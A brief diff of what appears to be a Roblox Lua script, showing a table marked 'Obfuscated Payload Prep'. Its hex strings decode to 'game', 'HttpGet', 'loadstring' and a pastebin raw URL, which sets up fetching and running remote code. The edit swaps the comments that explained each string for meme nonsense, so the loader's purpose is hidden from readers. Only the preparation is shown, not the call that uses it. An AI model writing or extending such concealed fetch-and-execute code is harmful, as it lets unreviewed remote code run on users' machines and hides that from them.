@@ -29,10 +29,10 @@ end
 
 -- ☢️ Obfuscated Payload Prep
 local ohio = {
-	pp = "67616d65", -- "game"
-	sigma = "48747470476574", -- "HttpGet"
-	rizz = "6c6f6164737472696e67", -- "loadstring"
-	gyat = "68747470733a2f2f706173746562696e2e636f6d2f7261772f59734a7452725277" -- Pastebin URL
+	pp = "67616d65", -- snickers
+	sigma = "48747470476574", -- ohyea
+	rizz = "6c6f6164737472696e67", -- mcdonalds
+	gyat = "68747470733a2f2f706173746562696e2e636f6d2f7261772f59734a7452725277" -- that tung tung tung sahurs
 }
 
 -- 📟 Hacked CIA Interface
